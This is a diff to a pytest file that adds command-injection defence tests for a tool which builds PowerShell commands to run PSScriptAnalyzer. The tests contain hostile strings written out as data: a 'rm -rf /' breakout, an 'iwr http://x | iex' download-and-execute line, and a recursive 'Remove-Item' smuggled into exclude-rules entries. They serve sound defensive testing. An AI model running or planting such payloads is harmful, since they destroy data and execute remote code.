@@ -1,5 +1,7 @@
 """Behaviour tests for makescripts._psscriptanalyzer: config reading, pwsh detection, file discovery, and orchestration."""
 
+# pyright: reportPrivateUsage=false
+
 from __future__ import annotations
 
 import subprocess
@@ -9,6 +11,8 @@ from unittest.mock import patch
 import pytest
 
 from bmk.adapters.stagerunner.helpers._psscriptanalyzer import (
+    _exclude_rule_fragment,
+    _ps_single_quote,
     check_pwsh,
     ensure_psscriptanalyzer,
     find_ps1_files,
@@ -16,6 +20,7 @@ from bmk.adapters.stagerunner.helpers._psscriptanalyzer import (
     main,
     run_psscriptanalyzer,
 )
+from bmk.adapters.stagerunner.helpers._toml_config import PSScriptAnalyzerConfig
 
 # ---------------------------------------------------------------------------
 # get_excluded_rules
@@ -283,6 +288,59 @@ def test_run_psscriptanalyzer_verbose_prints_command(tmp_path: Path, capsys: pyt
         )
 
     assert "Running:" in capsys.readouterr().out
+
+
+# ---------------------------------------------------------------------------
+# command-injection defences (a hostile pyproject.toml must not run PowerShell)
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.os_agnostic
+def test_ps_single_quote_doubles_embedded_quotes() -> None:
+    """A single quote is escaped by doubling, the only escape in a PS single-quoted string."""
+    assert _ps_single_quote("plain") == "'plain'"
+    assert _ps_single_quote("o'brien") == "'o''brien'"
+    assert _ps_single_quote("a'; rm -rf /; '") == "'a''; rm -rf /; '''"
+
+
+@pytest.mark.os_agnostic
+def test_exclude_rule_fragment_quotes_each_element_or_omits_when_empty() -> None:
+    """Rules become a quoted PS array; no rules means no -ExcludeRule flag at all."""
+    assert _exclude_rule_fragment(()) == ""
+    assert _exclude_rule_fragment(("PSAvoidUsingWriteHost",)) == " -ExcludeRule 'PSAvoidUsingWriteHost'"
+    assert _exclude_rule_fragment(("PSFoo", "PSBar")) == " -ExcludeRule 'PSFoo','PSBar'"
+
+
+@pytest.mark.os_agnostic
+def test_run_psscriptanalyzer_escapes_a_project_dir_with_a_quote(tmp_path: Path) -> None:
+    """A path containing a single quote is escaped, not left to break out of -Path."""
+    nasty = tmp_path / "o'brien"
+    with patch(
+        "bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run", return_value=_make_completed(0)
+    ) as mock_run:
+        run_psscriptanalyzer(pwsh="/usr/bin/pwsh", project_dir=nasty, exclude_rules=("PSAvoidUsingWriteHost",))
+    command = mock_run.call_args[0][0][3]
+    assert _ps_single_quote(str(nasty)) in command
+    assert "o''brien" in command  # the quote was doubled, not left raw
+
+
+@pytest.mark.os_agnostic
+def test_psscriptanalyzer_config_drops_non_rule_id_entries() -> None:
+    """The config boundary keeps only ^PS[A-Za-z0-9]+$ ids, dropping injection attempts."""
+    config = PSScriptAnalyzerConfig.model_validate(
+        {"exclude-rules": ["PSAvoidUsingWriteHost", "Evil; iwr http://x | iex; #", "PS With Space", "PSUseBOM"]}
+    )
+    assert config.exclude_rules == ("PSAvoidUsingWriteHost", "PSUseBOM")
+
+
+@pytest.mark.os_agnostic
+def test_get_excluded_rules_strips_injection_from_pyproject(tmp_path: Path) -> None:
+    """A malicious exclude-rules entry never reaches the pwsh command; valid ids survive."""
+    (tmp_path / "pyproject.toml").write_text(
+        '[tool.psscriptanalyzer]\nexclude-rules = ["PSAvoidUsingWriteHost", "X; Remove-Item -Recurse /"]\n',
+        encoding="utf-8",
+    )
+    assert get_excluded_rules(tmp_path / "pyproject.toml") == ("PSAvoidUsingWriteHost",)
 
 
 # ---------------------------------------------------------------------------
